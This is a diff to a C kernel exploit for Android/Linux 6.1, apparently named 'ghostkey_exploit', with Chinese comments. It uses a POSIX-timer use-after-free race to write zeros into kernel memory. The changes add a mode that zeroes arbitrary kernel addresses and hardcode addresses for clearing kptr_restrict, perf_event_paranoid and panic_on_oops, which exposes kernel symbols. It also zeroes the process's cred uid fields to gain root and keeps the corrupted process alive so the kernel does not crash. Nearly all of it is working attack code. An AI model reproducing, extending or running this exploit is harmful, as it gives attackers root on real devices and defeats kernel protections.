@@ -55,7 +55,7 @@
  *   [7] 退场           --daemon-exit：把钉页职责交给 cred_child 后父进程退出
  *
  *  one_uaf(target) 是整个利用的原子原语，每次调用都完整重跑一遍：
- *      child_race()  → collect_nth(1024) → reclaim_stream() → wait_zombie()
+ *      child_race()  → collect_nth(1024) → reclaim_stream() → wait_exec_hold()
  *      (fork 竞态)     (取 victim 页)      (socket 回填)        (确认 SIGKILL)
  *
  *  ---------------------------------------------------------------------------
@@ -197,6 +197,11 @@ struct profile {
     uint64_t groups;            /* init_groups */
     uint64_t ucounts;           /* init_ucounts */
     uint64_t task_alloc_link;   /* copy_process 里 task_struct 分配的 call site，0=未知 */
+    /* --poke 的两个内置目标。0 表示这份画像没带（老版本生成的文件、内置
+     * 表里没有的 KMI），此时退回本文件里的 6.1.134 常量并打警告。 */
+    uint64_t kptr_link;         /* kptr_restrict */
+    uint64_t paranoid_link;     /* sysctl_perf_event_paranoid（写时向下取 8 字节槽） */
+    uint64_t panic_link;        /* panic_on_oops */
     uint32_t task_cred;         /* task_struct 内 ->cred 指针的偏移 */
     uint32_t task_struct_size;  /* sizeof(struct task_struct)，BTF 下界 */
     uint32_t kitimer_node;      /* k_itimer 内悬挂节点(timerqueue/rb node)的偏移 */
@@ -254,6 +259,9 @@ static const struct profile PROFILE_6_1 = {
     .groups           = UINT64_C(0xffffffc00a032020),
     .ucounts          = UINT64_C(0xffffffc00a032588),
     .task_alloc_link  = UINT64_C(0xffffffc0083c7780),
+    .kptr_link        = UINT64_C(0xffffffc00a01d5f8),
+    .paranoid_link    = UINT64_C(0xffffffc00a00ba7c),
+    .panic_link       = UINT64_C(0xffffffc00a02bfa8),
     .task_cred        = 0x838,
     .task_struct_size = 0x12c0,
     .kitimer_node     = 0x78,
@@ -447,6 +455,11 @@ static const char *profile_key_alias(const char *key)
         { "cred_ucounts",         "cred_off_ucounts" },
         { "cred_user",            "cred_off_user" },
         { "cred_groups",          "cred_off_groups" },
+        /* 写零目标的符号名：允许画像里直接写 kallsyms 里的名字 */
+        { "kptr_restrict",        "kptr_link" },
+        { "perf_event_paranoid",  "paranoid_link" },
+        { "sysctl_perf_event_paranoid", "paranoid_link" },
+        { "panic_on_oops",        "panic_link" },
     };
     for (size_t i = 0; i < sizeof(tbl) / sizeof(tbl[0]); i++)
         if (!strcmp(key, tbl[i].from)) return tbl[i].to;
@@ -462,6 +475,7 @@ static int profile_apply(const char *key, uint64_t v)
     SETU64(page_offset); SETU64(timer_link); SETU64(cred_link);
     SETU64(selinux_link); SETU64(user_ns); SETU64(root_user);
     SETU64(groups); SETU64(ucounts); SETU64(task_alloc_link);
+    SETU64(kptr_link); SETU64(paranoid_link); SETU64(panic_link);
     SETU64(kitimer_size);
     SETU32(task_cred); SETU32(task_struct_size); SETU32(kitimer_node);
     SETU32(cred_size); SETU32(cred_uid);
@@ -578,7 +592,10 @@ static void profile_auto_select(void)
  * 全局状态
  * ========================================================================== */
 static uint64_t g_slide;         /* KASLR slide，随每次启动变化 */
+static int g_slide_known;        /* slide 是否可信（stage_a 命中或 --slide 给定） */
 static uint64_t g_task;          /* current 的 task_struct 内核虚拟地址 */
+static int g_panic_defused;      /* panic_on_oops 是否已清零 */
+static int g_kallsyms_ok;        /* /proc/kallsyms 是否已能读到真实符号值 */
 static uint64_t g_cred_kva;      /* 回填页里伪造 cred 的内核线性地址 */
 static int      g_plant_cred;    /* 回填形态：0=平铺 rb_node，1=伪造 struct cred */
 static int      g_kmem_filter_ok; /* kmem_cache_alloc 的 pid filter 是否生效 */
@@ -637,6 +654,27 @@ static int slide_in_window(uint64_t d)
 }
 static int      g_kaslr_only;    /* 仅泄露 KASLR slide：校准 A 完成即退出 */
 static int      g_lmap_only;     /* 仅泄露 page_offset：校准 B 完成即退出 */
+
+/* ---- 写零直通车：--poke ------------------------------------------------
+ * 不经提权链，只把 8 字节 0 写到指定内核地址。is_link=1 表示参数是画像
+ * 里的链接地址，运行时加 g_slide；否则按绝对值直接用（/proc/kallsyms 抄
+ * 下来的就是绝对值）。每次 poke 消耗一次 UAF，并留下一个 --exec-hold
+ * 守墓进程——这是必要的，树已经脏了，收尸就 oops。 */
+#define MAX_POKES 32
+/* 目标类型。前两种来自命令行，后三种来自画像里的符号：
+ * 参数解析按出现顺序进行，--poke-kptr 完全可能排在 --profile 前面，
+ * 所以符号地址不能在这里查，要等 run_pokes() 时画像已经定下来再展开。 */
+enum poke_kind {
+    POKE_ABS,           /* 命令行给的运行时绝对地址 */
+    POKE_LINK,          /* 命令行给的链接地址，+g_slide */
+    POKE_SYM_KPTR,      /* 画像里的 kptr_restrict */
+    POKE_SYM_PARANOID,  /* 画像里的 sysctl_perf_event_paranoid（写其 8 字节槽） */
+    POKE_SYM_PANIC,     /* 画像里的 panic_on_oops（写其 8 字节槽） */
+};
+struct poke_ent { uint64_t addr; int kind; const char *why; };
+static struct poke_ent g_pokes[MAX_POKES];
+static int      g_npoke;
+static int      g_poke_retry = 3;   /* 每个地址最多试几次 */
 static int      g_cred_only;     /* 仅探测一次 cred 分配地址：取到即退出 */
 static int      g_timer_pin_failed; /* timer_probe 里 pin_cpu(0) 是否失败 */
 /* 实际生效的 per-cpu ring buffer 大小（KB）。disarm_all() 会把它压到 7，
@@ -664,6 +702,22 @@ static void emit_status(const char *stage, const char *status)
  * 通用工具：tracefs 读写 / CPU 绑定 / 日志落盘
  * 原项目：uaf_plant.c:171-333、calib.c 的同名函数
  * ========================================================================== */
+/* 6.1.134 的 int panic_on_oops：.data，符号类型 D（不是 T）。
+ * 运行时 = 链接地址 + g_slide，统一走 slide_addr()。
+ * 紧随其后的 panic_timeout（+4，原 -1）会被 8 字节 store 一并清 0；
+ * 0 与 -1 都是 panic 后不重启，保留现场反而更好。 */
+#define KADDR_PANIC_ON_OOPS UINT64_C(0xffffffc00a02bfa8)
+
+/* ---- 暴露 /proc/kallsyms 的两个开关 -------------------------------------
+ * kptr_restrict（int，D 段）@ +0x201d5f8，8 字节对齐，紧跟其后的 4 字节
+ * 是 padding（下一符号 ptr_key 在 +8），所以 8 字节写零只清它自己。
+ * sysctl_perf_event_paranoid（int）@ +0x200ba7c 本身不是 8 字节对齐，
+ * 但它前一个 4 字节是 sysctl_unprivileged_bpf_disabled，两者拼成
+ * 0xffffffc00a00ba78 这个 8 字节槽；写零同时清 paranoid 和解禁非特权
+ * BPF，都是「放宽」方向，无功能破坏。 */
+#define KADDR_KPTR_RESTRICT     UINT64_C(0xffffffc00a01d5f8)
+#define KADDR_BPF_PARANOID_PAIR UINT64_C(0xffffffc00a00ba78)
+
 #define TRACE   "/sys/kernel/tracing"
 #define TRIGGER TRACE "/events/kmem/rss_stat/trigger"
 
@@ -1799,7 +1853,7 @@ static int stage_a_calibrate_slide(void)
         dump_kmem_size_hist(buf, used);
     }
     STAGE_LOG("site=%#" PRIx64 " count=%d slide=%#" PRIx64 " _text=%#" PRIx64,
-              best_site, best_count, g_slide, UINT64_C(0xffffffc080000000) + g_slide);
+              best_site, best_count, g_slide, UINT64_C(0xffffffc008000000) + g_slide);
     printf("C98260_SLIDE=0x%" PRIx64 "\n", g_slide);
     disarm_kmem_cache_alloc();
     return 0;
@@ -2116,38 +2170,24 @@ static void cred_child(void)
     }
 }
 
-static void log_proc_uid(pid_t pid)
+/* 读子进程 CapEff：区分「残血 root（有 uid 无 cap）」与完整 root */
+static uint64_t read_cap_eff(pid_t pid)
 {
     char path[64], line[160];
+    uint64_t v = 0;
     FILE *f;
     snprintf(path, sizeof(path), "/proc/%d/status", (int)pid);
     f = fopen(path, "r");
-    if (!f) return;
-    while (fgets(line, sizeof(line), f))
-        if (!strncmp(line, "Uid:", 4) || !strncmp(line, "CapEff:", 7) ||
-            !strncmp(line, "State:", 6))
-            LOG_DIM("[cred] proc %s", line);
+    if (!f) return 0;
+    while (fgets(line, sizeof(line), f)) {
+        if (!strncmp(line, "CapEff:", 7)) {
+            unsigned long long t = 0;
+            if (sscanf(line + 7, "%llx", &t) == 1) v = (uint64_t)t;
+            break;
+        }
+    }
     fclose(f);
-}
-
-static int ask_child(unsigned *uid, unsigned *euid)
-{
-    char buf[80];
-    struct pollfd pfd;
-    unsigned char go = 1;
-    ssize_t n;
-    if (kill(g_cred_child_pid, 0) != 0) { log_proc_uid(g_cred_child_pid); return -1; }
-    fcntl(g_report[0], F_SETFL, O_NONBLOCK);
-    while (read(g_report[0], buf, sizeof(buf)) > 0) ;
-    fcntl(g_report[0], F_SETFL, 0);
-    if (write(g_wake[1], &go, 1) != 1) return -1;
-    pfd.fd = g_report[0]; pfd.events = POLLIN;
-    if (poll(&pfd, 1, 2000) <= 0) { log_proc_uid(g_cred_child_pid); return -1; }
-    n = read(g_report[0], buf, sizeof(buf) - 1);
-    if (n < 0) return -1;
-    buf[n > 0 ? n : 0] = 0;
-    STAGE_LOG("answer %s", buf);
-    return sscanf(buf, "uid=%u euid=%u", uid, euid) == 2 ? 0 : -1;
+    return v;
 }
 
 /*
@@ -2561,7 +2601,7 @@ static int stage_c_leak_task(void)
 /* ==========================================================================
  * [4] UAF 竞态窗口（漏洞核心）
  * 原项目：uaf_plant.c:prepare_vmas / spawn_helper / locker_fn / killer_fn /
- *         exec_fn / child_race / wait_phase / wait_zombie
+ *         exec_fn / child_race / wait_phase / wait_exec_hold
  *
  * 四个角色：
  *   locker ×3 : 对 50000 个 VMA 反复 mprotect(PROT_NONE<->PROT_READ)，
@@ -2580,7 +2620,7 @@ static _Atomic int g_go, g_stop, g_lockers, g_in_mprotect, g_exec_tid, g_mprotec
 static void *g_vmas;
 static size_t g_vmalen;
 
-struct ipc { atomic_int phase; int helpers[4]; int nhelpers; };
+struct ipc { atomic_int phase; atomic_int will_exec; int helpers[4]; int nhelpers; };
 static struct ipc *ipc;
 
 static int prepare_vmas(void)
@@ -2654,7 +2694,7 @@ static void *exec_fn(void *arg)
     struct itimerspec spec;
     timer_t armed;
     int made = 0;
-    char *argv[] = { (char *)"ghostkey_exploit", (char *)"--exec-ok", NULL };
+    char *argv[] = { (char *)"ghostkey_exploit", (char *)"--exec-hold", NULL };
     (void)arg;
     memset(&ev, 0, sizeof(ev));            ev.sigev_notify = SIGEV_NONE;
     memset(&armed_ev, 0, sizeof(armed_ev)); armed_ev.sigev_notify = SIGEV_SIGNAL;
@@ -2688,7 +2728,10 @@ static void *exec_fn(void *arg)
         if (atomic_load_explicit(&g_stop, memory_order_acquire)) _exit(123);
         sched_yield();
     }
-    /* 触发点：execve 释放本线程组的 POSIX timer，armed timer 仍在到期路径上 */
+    /* 触发点：execve 释放本线程组的 POSIX timer，armed timer 仍在到期路径上。
+     * begin_new_exec() -> exit_itimers() 会走 posix_cpu_timer_del()，写原语
+     * 在那里落地；此后本 task 必须常驻，退出即遍历脏树 oops。 */
+    atomic_store_explicit(&ipc->will_exec, 1, memory_order_release);
     execve("/proc/self/exe", argv, NULL);
     _exit(122);
 }
@@ -2731,17 +2774,37 @@ static void stop_helpers(void)
     for (int i = 0; i < ipc->nhelpers && i < 4; i++)
         if (ipc->helpers[i] > 0) kill(ipc->helpers[i], SIGKILL);
 }
-static int wait_zombie(pid_t child, int *status_out)
+/* 等待 race child 完成 execve 并进入 --exec-hold 的 SIGSTOP 常驻态。
+ *
+ * 写原语（__rb_erase_augmented 的 left-child 分支）把 signal 的
+ * posix_cputimers timerqueue 根改成了 &task->cred 或页内假节点。这个 task
+ * 一旦退出，release_task -> __exit_signal -> posix_cpu_timers_exit[_group]
+ * 就会顺着脏指针遍历红黑树，必然 oops（PANIC_ON_OOPS 下直接 panic）。
+ * 只要它不退出，group_dead 永不成立，清理路径就永远不执行。
+ * 状态 T 出现在 /proc/<pid>/stat 即表示 execve 已返回（写原语发生在
+ * execve 内部，此时必然已完成）。 */
+static int wait_exec_hold(pid_t child)
 {
+    char path[64], buf[512];
+
+    snprintf(path, sizeof(path), "/proc/%d/stat", (int)child);
     for (int i = 0; i < 400; i++) {
-        siginfo_t info;
-        struct timespec nap = { .tv_nsec = 50000000 };
-        memset(&info, 0, sizeof(info));
-        if (waitid(P_PID, (id_t)child, &info, WEXITED | WNOHANG | WNOWAIT)) return -1;
-        if (info.si_pid == child) { *status_out = info.si_status; return info.si_code; }
+        struct timespec nap = { .tv_nsec = 10000000 };
+        int fd = open(path, O_RDONLY);
+        if (fd >= 0) {
+            ssize_t n = read(fd, buf, sizeof(buf) - 1);
+            close(fd);
+            if (n > 0) {
+                char *p;
+                buf[n] = 0;
+                p = strrchr(buf, ')');
+                if (p && p[1] == ' ' && (p[2] == 'T' || p[2] == 't'))
+                    return 0;
+            }
+        }
         nanosleep(&nap, NULL);
     }
-    return 0;
+    return -1;
 }
 
 /* [4a] 取第 1024 个 k_itimer 作为 victim
@@ -3002,7 +3065,6 @@ static int one_uaf(uint64_t target)
     struct timespec c0, c1;
     long cms;
     pid_t child;
-    int code, status = 0;
     uint64_t victim = 0;
     int nptr = 0;
     clock_gettime(CLOCK_MONOTONIC, &c0);
@@ -3012,6 +3074,7 @@ static int one_uaf(uint64_t target)
     atomic_store_explicit(&g_lockers, 0, memory_order_relaxed);
     atomic_store_explicit(&g_exec_tid, 0, memory_order_relaxed);
     atomic_store_explicit(&ipc->phase, 0, memory_order_relaxed);
+    atomic_store_explicit(&ipc->will_exec, 0, memory_order_relaxed);
     ipc->nhelpers = 0;
 
     child = fork();
@@ -3049,6 +3112,14 @@ static int one_uaf(uint64_t target)
     /* g_cred_kva is set by build_stream_pattern(): the cred no longer sits at
      * victim+P.kitimer_node, that address must stay a valid (zeroed) rb_node. */
     if (reclaim_stream(victim, target)) {
+        /* 已进入 execve 就不能 kill：exit_itimers 可能已跑过写原语，树已脏 */
+        int we = atomic_load_explicit(&ipc->will_exec, memory_order_acquire);
+        if (we) {
+            STAGE_LOG("page_miss 且已 exec：child=%d 转常驻守墓", (int)child);
+        } else {
+            kill(child, SIGKILL);
+            waitpid(child, NULL, 0);
+        }
         stop_helpers();
         clock_gettime(CLOCK_MONOTONIC, &c1);
         cms = (c1.tv_sec - c0.tv_sec) * 1000 + (c1.tv_nsec - c0.tv_nsec) / 1000000;
@@ -3056,19 +3127,19 @@ static int one_uaf(uint64_t target)
         return -1;
     }
     close_stream();
-    code = wait_zombie(child, &status);
-    STAGE_LOG("child=%d code=%d status=%d", (int)child, code, status);
-    if (waitpid(child, &status, 0) < 0) return -1;
-    clock_gettime(CLOCK_MONOTONIC, &c1);
-    cms = (c1.tv_sec - c0.tv_sec) * 1000 + (c1.tv_nsec - c0.tv_nsec) / 1000000;
-    STAGE_LOG("ms=%ld result=ok fast=%d", cms, g_fast);
-    log_sync();
-    stop_helpers();
-    /* 回收原因必须是 SIGKILL：说明竞态窗口确实由 killer 关闭 */
-    if (!WIFSIGNALED(status) || WTERMSIG(status) != SIGKILL) {
-        STAGE_LOG("回收原因不是 SIGKILL");
+    if (wait_exec_hold(child)) {
+        STAGE_LOG("child=%d 未进入常驻态，回收", (int)child);
+        kill(child, SIGKILL);
+        stop_helpers();
+        waitpid(child, NULL, 0);
         return -1;
     }
+    clock_gettime(CLOCK_MONOTONIC, &c1);
+    cms = (c1.tv_sec - c0.tv_sec) * 1000 + (c1.tv_nsec - c0.tv_nsec) / 1000000;
+    STAGE_LOG("child=%d 常驻守墓 ms=%ld result=ok fast=%d", (int)child, cms, g_fast);
+    log_sync();
+    stop_helpers();
+    /* 不 waitpid：child 必须存活，否则清理路径遍历被写坏的 timerqueue */
     return 0;
 }
 
@@ -3195,38 +3266,402 @@ static int stage_d_disable_selinux(void)
  * [8] 伪造 cred 提权 + 验证
  * 原项目：uaf_plant.c:2256-2286
  * ========================================================================== */
+/*
+ * 关掉 panic_on_oops。
+ *
+ * 首选写原语清 .data：不需要 uid=0、不需要 capability，SELinux 也拦不住。
+ * 写 0 走 __rb_erase_augmented() 的 pc==0 分支，__rb_change_child() 以
+ * parent==NULL 收尾，不会给红黑树留下假父节点。代价是一次 one_uaf，
+ * 会留一个 --exec-hold 守墓进程。
+ */
+static void defuse_panic(void)
+{
+    uint64_t addr = slide_addr(KADDR_PANIC_ON_OOPS);
+
+    if (g_panic_defused)
+        return;
+    if (!g_slide_known) {
+        /* slide 未知时地址会指错页，写 0 可能撞坏别的数据 */
+        STAGE_LOG("slide 未知，跳过 panic_on_oops 写原语");
+        return;
+    }
+
+    for (int i = 1; i <= 3 && !g_panic_defused; i++) {
+        if (one_uaf(addr) == 0) {
+            g_panic_defused = 1;
+            STAGE_LOG("panic_on_oops=0 addr=%#" PRIx64 "（第 %d 轮写原语命中）",
+                      addr, i);
+        } else {
+            STAGE_LOG("panic_on_oops 写原语第 %d/3 轮未命中", i);
+        }
+    }
+    if (!g_panic_defused)
+        STAGE_LOG("panic_on_oops 未清零，稍后残血 root 再走 sysctl");
+}
+
+/* 回退：残血 root 已就位时写 sysctl。该表项 handler 是 proc_dointvec，
+ * 不像 kptr_restrict 的 proc_dointvec_minmax_sysadmin 要 CAP_SYS_ADMIN。 */
+static void defuse_panic_sysctl(void)
+{
+    int fd;
+
+    if (g_panic_defused)
+        return;
+    fd = open("/proc/sys/kernel/panic_on_oops", O_WRONLY);
+    if (fd < 0) {
+        STAGE_LOG("panic_on_oops 打开失败 errno=%d", errno);
+        return;
+    }
+    if (write(fd, "0\n", 2) != 2) {
+        STAGE_LOG("panic_on_oops 写入失败 errno=%d", errno);
+    } else {
+        g_panic_defused = 1;
+        STAGE_LOG("panic_on_oops 已清零，oops 不再整机 panic");
+    }
+    close(fd);
+}
+
+/* ==========================================================================
+ * [E2.5] 暴露 /proc/kallsyms
+ *
+ * 6.1.134 的 kallsyms_show_value()（反汇编 0xffffffc0089eb110，被
+ * kallsyms_open 以 file->f_cred 内联调用）实际是三分支：
+ *
+ *   kptr_restrict >= 2  -> 0（谁都看不到，包括 full-cap root）
+ *   kptr_restrict == 1  -> capable(CAP_SYSLOG)
+ *   kptr_restrict == 0  -> perf_event_paranoid < 2 ? 1 : capable(CAP_SYSLOG)
+ *
+ * 所以「只把 kptr_restrict 写成 0」并不等于放行：Android 默认
+ * perf_event_paranoid=3，会 fallthrough 到 CAP_SYSLOG；残血 root 的
+ * CapEff=0 没有 CAP_SYSLOG，仍然读不到。必须把 paranoid 压到 <=1。
+ *
+ * 两条路径：
+ *   官方 sysctl —— 残血 root（euid=0）对 0644/root 文件有 owner 写权限，
+ *     test_perm 只看 euid 和 mode；perf_event_paranoid 的 handler 是普通
+ *     proc_dointvec_minmax，能写。kptr_restrict 的 handler 是 Android 定制
+ *     proc_dointvec_minmax_sysadmin，要求 CAP_SYS_ADMIN，残血 root 写不动。
+ *   写原语 —— 8 字节写零，两个地址都按 8 字节槽安全落位（见宏注释）。
+ *
+ * 注意 f_cred 语义：可见性在 open("/proc/kallsyms") 那一刻决定，之前
+ * 打开的 fd 不会因为后来提权而解除遮蔽——必须重新 open 才能验证。
+ * ========================================================================== */
+static int sysctl_read_int(const char *path, int *out)
+{
+    char b[32];
+    ssize_t n;
+    int fd = open(path, O_RDONLY);
+
+    if (fd < 0) return -1;
+    n = read(fd, b, sizeof(b) - 1);
+    close(fd);
+    if (n <= 0) return -1;
+    b[n] = 0;
+    *out = atoi(b);
+    return 0;
+}
+
+static int sysctl_write_int(const char *path, int v)
+{
+    char b[16];
+    int fd, n = snprintf(b, sizeof(b), "%d\n", v);
+
+    fd = open(path, O_WRONLY);
+    if (fd < 0) return -1;
+    if (write(fd, b, (size_t)n) != n) { close(fd); return -1; }
+    close(fd);
+    return 0;
+}
+
+/* 重新 open /proc/kallsyms，取 _text 与 stage_a 的 slide 交叉校验。
+ * 返回 0 表示确实读到了非零地址（遮蔽时所有值都是 0）。
+ * 读到值就以它为权威：stage_a 没成功时直接反推 slide；算错了就改回来。
+ * 这比「校验」更有价值——kallsyms 是唯一不依赖画像的自证来源。 */
+static int kallsyms_probe_text(void)
+{
+    FILE *f = fopen("/proc/kallsyms", "r");
+    char line[256], nm[128];
+    unsigned long long a;
+    char t;
+    uint64_t text = 0, derived;
+
+    if (!f) return -1;
+    while (fgets(line, sizeof(line), f)) {
+        if (sscanf(line, "%llx %c %127s", &a, &t, nm) == 3 &&
+            !strcmp(nm, "_text")) {
+            text = a;
+            break;
+        }
+    }
+    fclose(f);
+    if (!text) return -1;
+
+    derived = text - UINT64_C(0xffffffc008000000);
+    if (!g_slide_known) {
+        g_slide = derived;
+        g_slide_known = 1;
+        STAGE_LOG("kallsyms 反推 slide=%#" PRIx64 "（_text=%#" PRIx64
+                  "，stage_a 未成功，改用此值）", derived, text);
+    } else if (derived != g_slide) {
+        STAGE_LOG("kallsyms _text=%#" PRIx64 " 反推 slide=%#" PRIx64
+                  "，与 stage_a 的 %#" PRIx64 " 不符，改用 kallsyms",
+                  text, derived, g_slide);
+        g_slide = derived;
+    } else {
+        STAGE_LOG("kallsyms 校验通过：_text=%#" PRIx64 " == 0xffffffc008000000+slide",
+                  text);
+    }
+    return 0;
+}
+
+static void stage_expose_kallsyms(void)
+{
+    int kptr = -1, par = -1, w = 0;
+
+    if (g_kallsyms_ok) return;
+
+    sysctl_read_int("/proc/sys/kernel/kptr_restrict", &kptr);
+    sysctl_read_int("/proc/sys/kernel/perf_event_paranoid", &par);
+    STAGE_LOG("kallsyms 前置：kptr_restrict=%d perf_event_paranoid=%d", kptr, par);
+
+    /* 1) 官方路径：能写就写，零副作用、可回读 */
+    if (kptr > 0 && sysctl_write_int("/proc/sys/kernel/kptr_restrict", 0) == 0)
+        w |= 1;
+    if (par > 1 && sysctl_write_int("/proc/sys/kernel/perf_event_paranoid", 0) == 0)
+        w |= 2;
+    if (w) STAGE_LOG("sysctl 已改：kptr%s perf%s", (w & 1) ? "=0" : " 未变",
+                     (w & 2) ? "=0" : " 未变");
+
+    /* 2) 写原语兜底（残血 root 没有 CAP_SYS_ADMIN，Android handler 会拒） */
+    if (!(w & 1) && kptr != 0) {
+        if (!g_slide_known) {
+            STAGE_LOG("slide 未知，跳过 kptr_restrict 写原语");
+        } else {
+            uint64_t a = slide_addr(KADDR_KPTR_RESTRICT);
+            if (one_uaf(a) == 0) w |= 1;
+            STAGE_LOG("写原语 kptr_restrict=0 addr=%#" PRIx64 " %s",
+                      a, (w & 1) ? "命中" : "未命中");
+        }
+    }
+    if (!(w & 2) && par > 1) {
+        if (!g_slide_known) {
+            STAGE_LOG("slide 未知，跳过 perf_event_paranoid 写原语");
+        } else {
+            uint64_t a = slide_addr(KADDR_BPF_PARANOID_PAIR);
+            if (one_uaf(a) == 0) w |= 2;
+            STAGE_LOG("写原语 perf_event_paranoid=0（连带 bpf_disabled）addr=%#" PRIx64 " %s",
+                      a, (w & 2) ? "命中" : "未命中");
+        }
+    }
+
+    sysctl_read_int("/proc/sys/kernel/kptr_restrict", &kptr);
+    sysctl_read_int("/proc/sys/kernel/perf_event_paranoid", &par);
+    STAGE_LOG("kallsyms 后置：kptr_restrict=%d perf_event_paranoid=%d", kptr, par);
+
+    if (kallsyms_probe_text() == 0) {
+        g_kallsyms_ok = 1;
+        STAGE_LOG("/proc/kallsyms 已暴露（KALLSYMS_ALL=y，数据符号也在）");
+    } else {
+        STAGE_LOG("/proc/kallsyms 仍被遮蔽，后续继续用画像偏移");
+    }
+    log_sync();
+}
+
+/* ==========================================================================
+ * [E0] 写零直通车
+ *
+ * 只做一件事：把 0 写到给定地址。用于「不跑整条链、只想关掉某个开关」
+ * 的场景（kptr_restrict / perf_event_paranoid / panic_on_oops / 自定义）。
+ *
+ * 前提：slide 与 page_offset 已就位（stage_a / stage_b 跑过，或命令行给）。
+ * one_uaf() 的地址换算依赖 P.page_offset，链接地址还要 g_slide。
+ * 每次 poke 都烧一个 UAF 并留一个守墓进程——树已脏，收尸必 oops。
+ * ========================================================================== */
+static int poke_add(uint64_t addr, int kind, const char *why)
+{
+    if (g_npoke >= MAX_POKES) return -1;
+    g_pokes[g_npoke].addr = addr;
+    g_pokes[g_npoke].kind = kind;
+    g_pokes[g_npoke].why = why;
+    g_npoke++;
+    return 0;
+}
+
+/* 三条符号目标共用：画像里有就用，没有则只在 6.1.134 上退回内置常量。
+ * 其它 KMI 一律失败——把 6.1.134 的 .data 地址写到 6.6 上就是往
+ * 随机内核地址写 0，比不写危险得多。 */
+static int poke_sym(uint64_t link, uint64_t fallback, uint64_t *out, const char **src)
+{
+    if (link) {
+        *out = slide_addr(link & ~UINT64_C(7));
+        *src = "画像符号+slide";
+        return 0;
+    }
+    if (strstr(P.release, "6.1.134")) {
+        *out = slide_addr(fallback & ~UINT64_C(7));
+        *src = "画像缺符号，内置 6.1.134";
+        return 0;
+    }
+    *src = "画像没有这个符号，请重新解析 boot.img";
+    return -1;
+}
+
+/* 把一条目标展开成「运行时地址 + 来源说明」。
+ * 符号类在这里才读 P：--profile 可能出现在 --poke-kptr 之后。 */
+static int poke_resolve(const struct poke_ent *e, uint64_t *out, const char **src)
+{
+    switch (e->kind) {
+    case POKE_ABS:
+        *out = e->addr;
+        *src = "绝对地址";
+        return 0;
+    case POKE_LINK:
+        *out = slide_addr(e->addr);
+        *src = "链接地址+slide";
+        return 0;
+    case POKE_SYM_KPTR:
+        return poke_sym(P.kptr_link, KADDR_KPTR_RESTRICT, out, src);
+    case POKE_SYM_PARANOID:
+        return poke_sym(P.paranoid_link, KADDR_BPF_PARANOID_PAIR, out, src);
+    case POKE_SYM_PANIC:
+        return poke_sym(P.panic_link, KADDR_PANIC_ON_OOPS, out, src);
+    default:
+        *src = "目标类型未知";
+        return -1;
+    }
+}
+
+static int run_pokes(void)
+{
+    int fail = 0;
+
+    for (int i = 0; i < g_npoke; i++) {
+        uint64_t a = 0;
+        const char *src = "";
+        int ok = 0;
+
+        /* 符号类也是链接地址，同样要 slide */
+        if (g_pokes[i].kind != POKE_ABS && !g_slide_known) {
+            STAGE_LOG("poke[%d] %s 需要 slide，跳过（给 --slide 或先跑校准 A）",
+                      i, g_pokes[i].why);
+            fail = 1;
+            continue;
+        }
+        if (poke_resolve(&g_pokes[i], &a, &src)) {
+            STAGE_LOG("poke[%d] %s 跳过：%s", i, g_pokes[i].why,
+                      (src && *src) ? src : "目标未知");
+            fail = 1;
+            continue;
+        }
+
+        STAGE_LOG("poke[%d] %s addr=%#" PRIx64 "（%s）", i, g_pokes[i].why, a, src);
+        log_sync();
+        for (int r = 1; r <= g_poke_retry && !ok; r++) {
+            if (one_uaf(a) == 0) ok = 1;
+            else STAGE_LOG("poke[%d] 第 %d/%d 轮未命中", i, r, g_poke_retry);
+        }
+        STAGE_LOG("poke[%d] %s %s", i, g_pokes[i].why, ok ? "命中" : "失败");
+        if (!ok) fail = 1;
+        log_sync();
+    }
+
+    /* 回读自证：这三个 sysctl 都是 0444，普通用户可见 */
+    {
+        int v;
+        if (sysctl_read_int("/proc/sys/kernel/kptr_restrict", &v) == 0)
+            STAGE_LOG("回读 kptr_restrict=%d", v);
+        if (sysctl_read_int("/proc/sys/kernel/perf_event_paranoid", &v) == 0)
+            STAGE_LOG("回读 perf_event_paranoid=%d", v);
+        if (sysctl_read_int("/proc/sys/kernel/panic_on_oops", &v) == 0)
+            STAGE_LOG("回读 panic_on_oops=%d", v);
+        if (kallsyms_probe_text() == 0)
+            STAGE_LOG("/proc/kallsyms 现可读（poke 生效）");
+        else
+            STAGE_LOG("/proc/kallsyms 仍不可读（kptr 或 perf 未到位）");
+    }
+    return fail;
+}
+
 static int stage_e_escalate_cred(void)
 {
-    /*
-     * 不再伪造整页 cred。新路径：
-     *   capset -> prepare_creds 分配一个进程独占的 cred
-     *   -> ftrace 抓到地址
-     *   -> 用已验证安全的「写 0」原语清 uid / euid / fsuid。
-     *
-     * 写 0 走 pc == 0 分支：__rb_change_child 以 parent == NULL 收尾，
-     * root->rb_node 被清空，rb_next 返回 NULL，红黑树的指针问题不会
-     * 再被带进 cred 阶段。
-     */
     int rooted = 0;
-    g_plant_cred = 0;
+    uint64_t caps = 0;
+
+    /*
+     * 顺序：先残血 root，再关 panic_on_oops，最后补 caps。
+     *
+     * 写原语每次都会把承载 timer 的 task 的 timerqueue 红黑树改坏
+     * （root->rb_node 写成 &task->cred 或页内假节点）。守墓进程能挡住
+     * 清理，但它被 OOM/SIGKILL 杀掉时，oops 落在 release_task 里——
+     * 那里同时持 tasklist_lock（写）和 sighand->siglock，panic 与否
+     * 都会死锁。所以先用最可靠的写 0 路径拿到 euid=0，立刻关掉
+     * panic_on_oops 兜底，再去做风险更高的 full-cap。
+     */
+
+    /* [E1] 写 0 清 uid/euid/fsuid：只改 cred 结构体，不换 task->cred 指针 */
     for (int attempt = 1; attempt <= 6 && !rooted; attempt++) {
-        unsigned uid = 1, euid = 1;
         uint64_t cred = 0;
-        STAGE_LOG("第 %d/6 轮：泄漏 cred 地址", attempt);
+        STAGE_LOG("E1 第 %d/6 轮：泄漏 cred 地址", attempt);
         if (leak_cred_addr(&cred)) { STAGE_LOG("泄漏失败，重试"); continue; }
         STAGE_LOG("cred=%#" PRIx64 "，清零 uid/euid/fsuid", cred);
         log_sync();
         if (one_uaf(cred + P.cred_uid))        STAGE_LOG("写 cred+%u 未命中页", P.cred_uid);
-        log_proc_uid(g_cred_child_pid);        /* real uid 是否已经变 0 */
         if (one_uaf(cred + P.cred_uid + 16))   STAGE_LOG("写 cred+%u 未命中页", P.cred_uid + 16);
         if (one_uaf(cred + P.cred_uid + 24))   STAGE_LOG("写 cred+%u 未命中页", P.cred_uid + 24);
-        log_proc_uid(g_cred_child_pid);        /* effective uid 是否也变 0 */
-        if (ask_child(&uid, &euid) == 0 && uid == 0 && euid == 0) rooted = 1;
-        else STAGE_LOG("still uid=%u euid=%u", uid, euid);
+        if (getuid() == 0 && geteuid() == 0) rooted = 1;
